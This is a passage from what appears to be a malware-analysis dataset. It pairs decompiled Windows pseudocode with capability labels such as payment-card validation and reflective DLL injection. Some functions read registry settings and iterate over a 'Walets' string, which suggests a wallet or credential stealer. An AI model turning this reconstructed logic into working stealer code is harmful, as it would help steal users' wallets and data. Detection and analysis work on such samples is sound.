*(unaff_EBX + 0x18) = \"incomplete distance tree\";\n                    (**(unaff_EBX + 0x24))(*(unaff_EBX + 0x28), arg_24h_00);\n                    return -3;\n                }\n                if (iVar1 == -4) goto code_r0x0040b747;\n            }\n            *(unaff_EBX + 0x18) = \"empty distance tree with lengths\";\n            iVar1 = -3;\ncode_r0x0040b747:\n            (**(unaff_EBX + 0x24))(*(unaff_EBX + 0x28), arg_24h_00);\n            return iVar1;\n        }\n    }\n    else {\n        if (iVar1 == -3) {\n            *(unaff_EBX + 0x18) = \"oversubscribed literal/length tree\";\n            goto code_r0x0040b77b;\n        }\n        if (iVar1 == -4) goto code_r0x0040b77b;\n    }\n    *(unaff_EBX + 0x18) = \"incomplete literal/length tree\";\n    iVar1 = -3;\ncode_r0x0040b77b:\n    (**(unaff_EBX + 0x24))(*(unaff_EBX + 0x28), arg_24h_00);\n    return iVar1;\n}\n",
        "token_count": 752
    },
    "0040bdd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bdd0(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0042dff2(arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 48
    },
    "0040bea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nuint fcn.0040bea0(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    \n    if (unaff_ESI == 0) {\n        return 0xfffffffe;\n    }\n    *(unaff_ESI + 0x18) = 0;\n    if (*(unaff_ESI + 0x20) == 0) {\n        *(unaff_ESI + 0x20) = fcn.0040bdd0;\n        *(unaff_ESI + 0x28) = 0;\n    }\n    if (*(unaff_ESI + 0x24) == 0) {\n        *(unaff_ESI + 0x24) = fcn.0040bdf0;\n    }\n    iVar1 = (**(unaff_ESI + 0x20))(*(unaff_ESI + 0x28), 1, 0x18);\n    *(unaff_ESI + 0x1c) = iVar1;\n    if (iVar1 != 0) {\n        *(iVar1 + 0x14) = 0;\n        *(*(unaff_ESI + 0x1c) + 0xc) = 0;\n        *(*(unaff_ESI + 0x1c) + 0xc) = 1;\n        *(*(unaff_ESI + 0x1c) + 0x10) = 0xf;\n        iVar1 = fcn.0040a570(~-(*(*(unaff_ESI + 0x1c) + 0xc) != 0) & 0x40bc90);\n        *(*(unaff_ESI + 0x1c) + 0x14) = iVar1;\n        if (iVar1 != 0) {\n            fcn.0040be10();\n            return 0;\n        }\n        fcn.0040be50();\n    }\n    return 0xfffffffc;\n}\n",
        "token_count": 425
    },
    "0040c4c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040c4c0(int32_t param_1)\n\n{\n    char cVar1;\n    char *in_EAX;\n    char cVar2;\n    \n    param_1 = param_1 - in_EAX;\n    while( true ) {\n        cVar1 = in_EAX[param_1];\n        cVar2 = *in_EAX;\n        in_EAX = in_EAX + 1;\n        if (cVar1 + 0x9fU < 0x1a) {\n            cVar1 = cVar1 + -0x20;\n        }\n        if (cVar2 + 0x9fU < 0x1a) {\n            cVar2 = cVar2 + -0x20;\n        }\n        if (cVar1 == '\\0') {\n            return -(cVar2 != '\\0');\n        }\n        if (cVar2 == '\\0') {\n            return 1;\n        }\n        if (cVar1 < cVar2) break;\n        if (cVar2 < cVar1) {\n            return 1;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 251
    },
    "0040cc80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t fcn.0040cc80(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    \n    if (unaff_ESI == 0) {\n        return -0x66;\n    }\n    *(unaff_ESI + 0x14) = *(unaff_ESI + 0x24);\n    *(unaff_ESI + 0x10) = 0;\n    iVar1 = fcn.0040c880(unaff_ESI + 0x28, unaff_ESI + 0x78, 0, 0);\n    *(unaff_ESI + 0x18) = iVar1 == 0;\n    return iVar1;\n}\n",
        "token_count": 154
    },
    "0040d530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d530(void)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    uint *unaff_ESI;\n    \n    *unaff_ESI = 0;\n    unaff_ESI[1] = 0xffffffff;\n    unaff_ESI[0x4d] = 0xffffffff;\n    unaff_ESI[0x4e] = 0;\n    unaff_ESI[0x4f] = 0;\n    pcVar2 = fcn.0042cbeb(1);\n    unaff_ESI[0x4e] = pcVar2;\n    pcVar3 = 0x44c726;\n    do {\n        cVar1 = *pcVar3;\n        *pcVar2 = cVar1;\n        pcVar3 = pcVar3 + 1;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    return;\n}\n",
        "token_count": 215
    },
    "0040e260": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040e260(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x44230b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = fcn.0042ddfe(0x244);\n    var_4h = 0;\n    if (iVar2 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.0040d530(uVar1);\n    }\n    var_4h = 0xffffffff;\n    *0x4576b0 = fcn.0040d580(arg_8h, arg_ch);\n    if (*0x4576b0 != 0) {\n        if (iVar2 != 0) {\n            fcn.0040e310();\n        }\n        *in_FS_OFFSET = var_ch;\n        return NULL;\n    }\n    puVar3 = fcn.0042ddfe(8);\n    *puVar3 = 1;\n    puVar3[1] = iVar2;\n    *in_FS_OFFSET = var_ch;\n    return puVar3;\n}\n",
        "token_count": 339
    },
    "0040e310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040e310(void)\n\n{\n    int32_t unaff_ESI;\n    \n    if (*(unaff_ESI + 0x138) != 0) {\n        fcn.0042e173(*(unaff_ESI + 0x138));\n    }\n    *(unaff_ESI + 0x138) = 0;\n    if (*(unaff_ESI + 0x13c) != 0) {\n        fcn.0042e173(*(unaff_ESI + 0x13c));\n    }\n    *(unaff_ESI + 0x13c) = 0;\n    fcn.0042d62b();\n    return;\n}\n",
        "token_count": 149
    },
    "0040ebb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ebb0(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = (**0x45757c)(0, 60000);\n    uVar1 = (**0x457504)(uVar1);\n    (**0x457520)(uVar1, arg_8h);\n    var_4h._0_2_ = 0x2c;\n    iVar2 = fcn.0042e17e(uVar1, &var_4h, &var_8h);\n    if (iVar2 != 0) {\n        iVar3 = 0;\n        do {\n    // switch table (12 cases) at 0x40ed80\n            switch(iVar3) {\n            case 0:\n                *0x4552c8 = 1;\n                break;\n            case 1:\n                iVar2 = (**0x457550)(iVar2, 0x44eb8c);\n                if (iVar2 == 0) {\n                    *0x4576dc = 1;\n                }\n                break;\n            case 2:\n                iVar2 = (**0x457550)(iVar2, 0x44eb8c);\n                if (iVar2 == 0) {\n                    *0x4576dd = 1;\n                }\n                break;\n            case 3:\n                iVar2 = (**0x457550)(iVar2, 0x44eb8c);\n                if (iVar2 == 0) {\n                    *0x4576de = 1;\n                }\n                break;\n            case 4:\n                iVar2 = (**0x457550)(iVar2, 0x44eb8c);\n                if (iVar2 == 0) {\n                    *0x4576e4 = 1;\n                }\n                break;\n            case 5:\n                uVar1 = (**0x45757c)(0, 999999);\n                uVar1 = (**0x457504)(uVar1);\n                *0x4572e4 = uVar1;\n                goto code_r0x0040ed50;\n            case 6:\n                iVar2 = (**0x457550)(iVar2, 0x44eb8c);\n                if (iVar2 == 0) {\n                    *0x4576e1 = 1;\n                }\n                break;\n            case 7:\n                iVar2 = (**0x457550)(iVar2, 0x44eb8c);\n                if (iVar2 == 0) {\n                    *0x4576e3 = 1;\n                }\n                break;\n            case 8:\n                iVar2 = (**0x457550)(iVar2, 0x44eb8c);\n                if (iVar2 == 0) {\n                    *0x4576e8 = 1;\n                }\n                break;\n            case 9:\n                iVar2 = (**0x457550)(iVar2, 0x44eb8c);\n                if (iVar2 == 0) {\n                    *0x4576e0 = 1;\n                }\n                break;\n            case 10:\n                iVar2 = (**0x457550)(iVar2, 0x44eb8c);\n                if (iVar2 == 0) {\n                    *0x4576e2 = 1;\n                }\n                break;\n            case 0xb:\n                uVar1 = (**0x45757c)(0, 999999);\n                uVar1 = (**0x457504)(uVar1);\n                *0x4572d8 = uVar1;\ncode_r0x0040ed50:\n                (**0x457520)(uVar1, iVar2);\n            }\n            iVar2 = fcn.0042e17e(0, &var_4h, &var_8h);\n            iVar3 = iVar3 + 1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 886
    },
    "0040f830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f830(void)\n\n{\n    int32_t iVar1;\n    uint *arg_8h;\n    uint var_bc0h;\n    uint var_7d8h;\n    uint var_3f0h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    fcn.00434d30(&var_3f0h, 0, 1000);\n    fcn.00434d30(&var_bc0h, 0, 1000);\n    (**0x457520)(&var_bc0h, *0x456dbc);\n    fcn.00434d30(&var_7d8h, 0, 1000);\n    iVar1 = (**0x457500)(0, 0x1a, 0, 0, &var_7d8h);\n    (**0x457520)(&var_3f0h, (iVar1 < 0) - 1 & &var_7d8h);\n    arg_8h = &var_3f0h;\n    (**0x457520)(arg_8h, &var_bc0h);\n    fcn.0040f4b0();\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 292
    },
    "00410690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00410690(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t noname_3;\n    uint in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    uint in_stack_00000060;\n    uint in_stack_00000064;\n    uint var_4h;\n    \n    var_4h = in_ECX;\n    noname_3 = fcn.0042e17e(in_ECX, 0x44ebe0, &var_4h);\n    while (noname_3 != 0) {\n        fcn.0040ffa0(arg_ch, 0x44c726, arg_8h, noname_3, arg_10h, arg_14h, arg_18h, unaff_EBX, unaff_EDI, 0, unaff_ESI, \n                     0, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, in_stack_00000018, \n                     in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                     in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, \n                     in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050, in_stack_00000054, \n                     in_stack_00000058, in_stack_0000005c, in_stack_00000060, in_stack_00000064);\n        noname_3 = fcn.0042e17e(0, 0x44ebe0, &var_4h);\n    }\n    return;\n}\n",
        "token_count": 646
    },
    "00412410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00412410(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, \n            uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, uint noname_67, \n            uint noname_68, uint noname_69, uint noname_70, uint noname_71, uint noname_72, uint noname_73, \n            uint noname_74, uint noname_75, uint noname_76, uint noname_77, uint noname_78, uint noname_79, uint arg_8h\n            , uint noname_81, uint noname_82, uint noname_83, uint noname_84, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_8h;\n    uint var_18h;\n    uint32_t var_1ch;\n    uint32_t var_24h;\n    uint var_34h;\n    uint32_t var_38h;\n    uint var_40h_2;\n    uint32_t var_54h;\n    uint var_40h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_90h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_58h;\n    uint var_50h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint *arg_8h_00;\n    uint noname_2_00;\n    uint noname_3_00;\n    uint32_t in_stack_fffffebc;\n    uint in_stack_fffffec0;\n    uint in_stack_fffffec4;\n    uint in_stack_fffffec8;\n    uint arg_28h;\n    uint arg_2ch;\n    uint in_stack_fffffed4;\n    uint noname_11_00;\n    uint noname_13_00;\n    uint arg_40h;\n    uint in_stack_fffffeec;\n    uint var_cch_2;\n    uint var_c8h_2;\n    uint var_c4h_2;\n    uint var_90h_2;\n    uint32_t var_88h;\n    uint var_78h;\n    uint32_t var_74h;\n    uint *var_6ch_2;\n    uint var_8ch;\n    uint var_5ch_2;\n    uint32_t var_58h_2;\n    uint var_50h_2;\n    uint32_t var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    uStack12 = 0x442286;\n    var_ch_2 = *in_FS_OFFSET;\n    var_10h_2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    var_58h_2 = 0xf;\n    var_5ch_2 = 0;\n    var_6ch_2 = var_6ch_2 & 0xffffff00;\n    var_4h_2._0_1_ = 3;\n    var_4h_2._1_3_ = 0;\n    fcn.00434d30();\n    fcn.00434d30();\n    (**0x457418)();\n    (**0x4573fc)();\n    (**0x457550)();\n    arg_40h = 0xffffffff;\n    noname_13_00 = 0;\n    puVar2 = &var_40h_2;\n    fcn.004092e0(puVar2, 0, 0xffffffff);\n    noname_11_00 = 0;\n    noname_3_00 = 0xffffffff;\n    var_4h_2._0_1_ = 4;\n    noname_2_00 = 0;\n    arg_8h_00 = &var_8h;\n    arg_2ch = 0xf;\n    arg_28h = 0;\n    in_stack_fffffebc = in_stack_fffffebc & 0xffffff00;\n    fcn.004092e0(arg_8h_00, 0, 0xffffffff);\n    var_4h_2._0_1_ = 3;\n    fcn.004113d0(&var_88h, arg_8h_00, noname_2_00, noname_3_00, in_stack_fffffebc, in_stack_fffffec0, in_stack_fffffec4\n                 , in_stack_fffffec8, arg_28h, arg_2ch, in_stack_fffffed4, noname_11_00, puVar2, noname_13_00, arg_40h);\n    var_4h_2._0_1_ = 5;\n    fcn.00408ff0();\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 3);\n    if (0xf < var_74h) {\n        fcn.0042d62b();\n    }\n    var_74h = 0xf;\n    var_78h = 0;\n    var_88h = var_88h & 0xffffff00;\n    iVar1 = (**0x457550)();\n    if (iVar1 == 0) {\n        fcn.004090e0(\"ERROR\", 5);\n    }\n    else {\n        fcn.004092e0(&var_8h, 0, 0xffffffff);\n        puVar2 = var_6ch_2;\n        if (var_58h_2 < 0x10) {\n            puVar2 = &var_6ch_2;\n        }\n        fcn.0040ebb0(puVar2);\n    }\n    var_5ch_2 = 0;\n    puVar2 = var_6ch_2;\n    if (var_58h_2 < 0x10) {\n        puVar2 = &var_6ch_2;\n    }\n    *puVar2 = 0;\n    if (0xf < var_58h_2) {\n        fcn.0042d62b();\n    }\n    var_58h_2 = 0xf;\n    var_5ch_2 = 0;\n    var_6ch_2 = var_6ch_2 & 0xffffff00;\n    if (0xf < var_1ch) {\n        fcn.0042d62b();\n    }\n    var_1ch = 0xf;\n    var_18h = 0;\n    var_8h = var_8h & 0xffffff00;\n    if (0xf < var_38h) {\n        fcn.0042d62b();\n    }\n    var_38h = 0xf;\n    var_34h = 0;\n    var_24h = var_24h & 0xffffff00;\n    if (0xf < var_54h) {\n        fcn.0042d62b();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042d636(in_stack_fffffeec);\n    return;\n}\n",
        "token_count": 1999
    },
    "00413b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413b20(void)\n\n{\n    int32_t iVar1;\n    char *arg_8h;\n    uint var_218h;\n    uint var_214h;\n    uchar var_210h;\n    uint var_20fh;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_218h = 0xff;\n    var_210h = 0;\n    fcn.00434d30(&var_20fh, 0, 0xfe);\n    iVar1 = (**0x457448)(0x80000001, *0x456e1c, 0, 0x20119, &var_214h);\n    if (iVar1 == 0) {\n        (**0x45742c)(var_214h, *0x4571ac, 0, 0, &var_210h, &var_218h);\n    }\n    (**0x4574d0)(var_214h);\n    fcn.00434d30(&var_110h, 0, 0x104);\n    (**0x457520)(&var_110h, &var_210h);\n    arg_8h = \"\\\\config\\\\\";\n    (**0x457520)(&var_110h);\n    fcn.004139a0(*0x456b18);\n    fcn.004139a0(*0x456da8);\n    fcn.004139a0(*0x456abc);\n    fcn.004139a0(*0x457268);\n    fcn.004139a0(*0x456e08);\n    fcn.004139a0(*0x45700c);\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 402
    },
    "00413c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_154h_3\n// WARNING: Variable defined which should be unmapped: var_14ch\n// WARNING: Variable defined which should be unmapped: var_150h_5\n// WARNING: Variable defined which should be unmapped: var_138h\n// WARNING: Variable defined which should be unmapped: var_158h_2\n// WARNING: Variable defined which should be unmapped: var_130h_3\n// WARNING: Variable defined which should be unmapped: var_158h_3\n// WARNING: Variable defined which should be unmapped: var_130h_4\n// WARNING: Variable defined which should be unmapped: var_154h_2\n// WARNING: Variable defined which should be unmapped: var_11ch_3\n// WARNING: Variable defined which should be unmapped: var_120h_2\n// WARNING: Variable defined which should be unmapped: var_154h\n// WARNING: Variable defined which should be unmapped: var_150h_3\n// WARNING: Variable defined which should be unmapped: var_150h_4\n// WARNING: Variable defined which should be unmapped: var_150h_2\n// WARNING: Variable defined which should be unmapped: var_130h_2\n// WARNING: Variable defined which should be unmapped: var_150h\n// WARNING: Variable defined which should be unmapped: var_130h\n// WARNING: Variable defined which should be unmapped: var_11ch_2\n// WARNING: Variable defined which should be unmapped: var_114h_4\n// WARNING: Variable defined which should be unmapped: var_120h\n// WARNING: Variable defined which should be unmapped: var_11ch\n// WARNING: Variable defined which should be unmapped: var_114h_6\n// WARNING: Variable defined which should be unmapped: var_114h_2\n// WARNING: Variable defined which should be unmapped: var_114h_3\n// WARNING: Variable defined which should be unmapped: var_114h_5\n// WARNING: Removing unreachable block (ram,0x004143d1)\n// WARNING: Removing unreachable block (ram,0x004142d5)\n// WARNING: Removing unreachable block (ram,0x0041429b)\n// WARNING: Removing unreachable block (ram,0x00414228)\n// WARNING: Removing unreachable block (ram,0x00413e95)\n// WARNING: Removing unreachable block (ram,0x00414128)\n// WARNING: Removing unreachable block (ram,0x004141ef)\n// WARNING: Removing unreachable block (ram,0x00414262)\n// WARNING: Removing unreachable block (ram,0x00414329)\n// WARNING: Removing unreachable block (ram,0x00414406)\n// WARNING: Removing unreachable block (ram,0x0041419b)\n// WARNING: Removing unreachable block (ram,0x0041437d)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00413c70(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t noname_18;\n    int32_t iVar3;\n    uint32_t noname_0;\n    int32_t iVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_4h_5;\n    uint var_4h_8;\n    uint var_4h_4;\n    uint var_10h_2;\n    uint var_ch_2;\n    uint var_4h_11;\n    uint var_4h_2;\n    uint var_4h_7;\n    uint var_4h_3;\n    uint var_4h_10;\n    uint var_4h;\n    uint var_158h;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint noname_0_00;\n    uint noname_1;\n    uint noname_2;\n    uint32_t in_stack_fffffe18;\n    uint in_stack_fffffe1c;\n    uint in_stack_fffffe20;\n    uint in_stack_fffffe24;\n    uint32_t in_stack_fffffe28;\n    uint in_stack_fffffe2c;\n    uint in_stack_fffffe30;\n    uchar *in_stack_fffffe34;\n    uint uVar9;\n    uint uVar10;\n    uchar *puVar11;\n    int32_t in_stack_fffffe40;\n    uchar *in_stack_fffffe44;\n    uint in_stack_fffffe50;\n    uint in_stack_fffffe54;\n    uint noname_18_00;\n    uint in_stack_fffffe58;\n    uint in_stack_fffffe5c;\n    uint in_stack_fffffe60;\n    uint in_stack_fffffe64;\n    uint uVar12;\n    uint in_stack_fffffe6c;\n    uint in_stack_fffffe70;\n    uint in_stack_fffffe74;\n    uint in_stack_fffffe78;\n    uint in_stack_fffffe7c;\n    char *in_stack_fffffe80;\n    uint uVar13;\n    uint noname_14;\n    char32_t *pcVar14;\n    char *noname_27;\n    uchar *noname_16;\n    uint var_154h_3;\n    uint var_14ch;\n    uint var_150h_5;\n    uchar *puVar15;\n    uchar *in_stack_fffffea8;\n    uint var_138h;\n    uint var_158h_2;\n    uint var_130h_3;\n    uint var_158h_3;\n    uint var_130h_4;\n    uint var_154h_2;\n    uint32_t in_stack_fffffec4;\n    uint var_11ch_3;\n    uint32_t var_120h_2;\n    uint var_154h;\n    uint var_150h_3;\n    uint in_stack_fffffed8;\n    uint var_150h_4;\n    uint32_t var_150h_2;\n    uint var_130h_2;\n    uint in_stack_fffffee8;\n    uint in_stack_fffffeec;\n    uint var_150h;\n    uint var_130h;\n    uint var_11ch_2;\n    uint var_114h_4;\n    uint in_stack_ffffff00;\n    uint var_120h;\n    uint var_11ch;\n    uint var_114h_6;\n    uint var_114h_2;\n    uint in_stack_ffffff14;\n    uint var_114h_3;\n    uint in_stack_ffffff1c;\n    uint in_stack_ffffff20;\n    uint in_stack_ffffff24;\n    uint var_114h_5;\n    uint in_stack_ffffff2c;\n    uint in_stack_ffffff30;\n    uint in_stack_ffffff34;\n    uint in_stack_ffffff38;\n    uint in_stack_ffffff3c;\n    uint in_stack_ffffff40;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff48;\n    uint in_stack_ffffff4c;\n    uint in_stack_ffffff50;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint in_stack_ffffff74;\n    uint var_4h_6;\n    uint var_4h_9;\n    int32_t iStack16;\n    uint uStack12;\n    uint var_4h_12;\n    \n    var_4h_12 = 0xffffffff;\n    uStack12 = 0x4427c4;\n    iStack16 = *in_FS_OFFSET;\n    noname_18 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    noname_14 = 0x413cb1;\n    fcn.00434d30();\n    noname_16 = &stack0xfffffee8;\n    (**0x457520)();\n    do {\n        uVar2 = var_120h_2;\n        pcVar14 = L\"|Walets\";\n        puVar11 = &stack0xfffffe6c;\n        uVar12 = 0x413ce5;\n        fcn.0040e720();\n        var_4h_12 = 2;\n        fcn.0040e7b0();\n        var_4h_12._0_1_ = 3;\n        iVar3 = fcn.0040e7b0();\n        noname_0 = *(iVar3 + 0x10) + 1;\n        var_4h_12 = CONCAT31(var_4h_12._1_3_, 5);\n        iVar3 = 0x413d1d;\n        fcn.00412220(noname_0, in_stack_fffffe50, in_stack_fffffe54, in_stack_fffffe58, in_stack_fffffe5c, \n                     in_stack_fffffe60, in_stack_fffffe64, uVar12, in_stack_fffffe6c, in_stack_fffffe70, \n                     in_stack_fffffe74, in_stack_fffffe78, in_stack_fffffe7c, in_stack_fffffe80, noname_14, pcVar14, \n                     noname_16, 0x44ed28, noname_18, unaff_EDI, unaff_ESI, unaff_EBX, puVar11, in_stack_fffffea8, \n                     &stack0xfffffe50, var_158h_2, var_130h_3, var_158h_3, var_130h_4, var_154h_2, in_stack_fffffec4, \n                     var_11ch_3, var_120h_2, var_154h, var_150h_3, in_stack_fffffed8, var_150h_4, var_150h_2, var_130h_2\n                     , in_stack_fffffee8, in_stack_fffffeec, var_150h, var_130h, var_11ch_2, var_114h_4, \n                     in_stack_ffffff00, var_120h, var_11ch, var_114h_6, var_114h_2, in_stack_ffffff14, var_114h_3, \n                     in_stack_ffffff1c, in_stack_ffffff20, in_stack_ffffff24, var_114h_5, in_stack_ffffff2c, \n                     in_stack_ffffff30, in_stack_ffffff34, in_stack_ffffff38);\n        var_4h_12 = 0xffffffff;\n        if (0xf < var_150h_2) {\n            fcn.0042d62b();\n        }\n        var_120h_2 = var_120h_2 & 0xffffff00;\n        noname_14 = *0x4552cc;\n        if (*0x4552e0 < 0x10) {\n            noname_14 = 0x4552cc;\n        }\n        noname_27 = \"ERROR\";\n        uVar13 = 0x413d79;\n        iVar4 = (**0x457550)();\n        if (iVar4 != 0) {\n            in_stack_fffffe64 = 0x413d91;\n            fcn.0040e810();\n            puVar11 = &stack0xfffffe4c;\n            var_4h_12 = 6;\n            pcVar5 = &stack0xfffffee8;\n            in_stack_fffffe60 = 0xf;\n            in_stack_fffffe5c = 0;\n            noname_0 = noname_0 & 0xffffff00;\n            do {\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            iVar3 = pcVar5 - &stack0xfffffee9;\n            in_stack_fffffe44 = &stack0xfffffee8;\n            in_stack_fffffe40 = 0x413dd6;\n            fcn.004090e0(in_stack_fffffe44, iVar3);\n            puVar15 = &stack0xfffffe28;\n            var_4h_12 = CONCAT31(var_4h_12._1_3_, 7);\n            in_stack_fffffe24 = 0xffffffff;\n            in_stack_fffffe20 = 0;\n            uVar10 = 0xf;\n            uVar9 = 0;\n            in_stack_fffffe1c = 0x4552cc;\n            in_stack_fffffe28 = in_stack_fffffe28 & 0xffffff00;\n            fcn.004092e0(0x4552cc, 0, 0xffffffff);\n            var_4h_12 = 0xffffffff;\n            in_stack_fffffe18 = 0x413e07;\n            fcn.00412410(in_stack_fffffe1c, in_stack_fffffe20, in_stack_fffffe24, in_stack_fffffe28, in_stack_fffffe2c, \n                         in_stack_fffffe30, in_stack_fffffe34, uVar9, uVar10, in_stack_fffffe40, in_stack_fffffe44, \n                         iVar3, noname_0, in_stack_fffffe50, in_stack_fffffe54, in_stack_fffffe58, in_stack_fffffe5c, \n                         in_stack_fffffe60, in_stack_fffffe64, uVar12, in_stack_fffffe6c, in_stack_fffffe70, \n                         in_stack_fffffe74, in_stack_fffffe78, in_stack_fffffe7c, uVar13, noname_14, noname_27, \n                         noname_16, 0x44ed28, noname_18, unaff_EDI, unaff_ESI, unaff_EBX, puVar11, puVar15, \n                         &stack0xfffffe68, var_158h_2, var_130h_3, var_158h_3, var_130h_4, var_154h_2, in_stack_fffffec4\n                         , var_11ch_3, 